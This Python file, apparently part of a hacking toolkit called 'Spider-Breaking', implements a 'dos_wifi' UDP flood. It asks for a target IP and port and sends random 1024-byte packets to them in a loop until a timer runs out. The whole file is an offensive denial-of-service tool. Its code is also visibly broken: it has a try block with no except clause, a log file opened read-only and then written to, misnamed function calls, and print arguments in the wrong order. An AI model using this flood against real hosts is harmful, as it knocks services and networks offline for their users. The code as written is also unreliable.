import datetime
import json
import os
import random
import socket
import sys
import time

date_wrtite = datetime.datetime.now()

from files.ban.banners import ban_dos_wifi
from en.credits.credits import credits_en
from files.warn.warn import keyboard, file_not_found_log, i_e_colo

try:
    from colorama import Fore, Style, Back
except ImportError:
    i_e_colo()

try:
    with open("Spider-Breaking\Windows\\files\config\config.json") as f:
        user_data = json.load(f)
    user_usr = user_data.get("user_name_usr").get("user_input_usr")
except FileNotFoundError:
    from files.CCF import start_create_and_write_config
    start_create_and_write_config()

try:
    FWS = open("Spider-Breaking\Windows\\files\log\log.txt")

def cl():
    os.system("cls")

def main():
    global cl
    def start_dos(dos_wifi):
        global cl
        try:
            cl()
            FWS.write(f'{user_usr}:StartCode "dos_wifi_en" - ' + str(date_wrtite) + '\n')
            FWS.close()
            ban_dos_wifi()
            credits_en()
            print(Fore.YELLOW + 'Enter the IP Address' + Style.RESET_ALL)
            ip = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL +  Style.NORMAL)
            print('\n')
            print(Fore.YELLOW + 'Specify the port of the IP-Address which you entered' + Style.RESET_ALL)
            port = int(input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL + Style.NORMAL))
            print('\n')
            print(Fore.YELLOW + 'Specify the number of packages' + Style.RESET_ALL)
            print('\n')
            package = int(input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL + Style.NORMAL))
            cl()
            print(Fore.YELLOW + 'Press CTRL + C or CTRL + Z to stop' + Style.RESET_ALL)
            time.sleep(3)
            def flood(victim, vport, duration):
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1024)
                timeout = time.time() + duration
                sent = 3000

                while 1:
                    if time.time() > timeout:
                        break
                    else:
                        pass
                    client.sendto(bytes, (victim, vport))
                    sent = sent + 1
                    print('Attack %s sent packages %s to the port %s '%(sent, victim, vport))
            flood(ip, int(port), int(package))
        except KeyboardInterrupt:
            keyboard()
    def test_dos_wifi(test_dos_wifi):
        global cl
        print()
        cl()
    return test_dos_wifi

def dos_wifi():
    doss_wifi = main.start_dos(dos_wifi)
    doss_wifi

def test_dos_wifi():
    my_test = main.test_dos_wifi(test_dos_wifi)
    my_test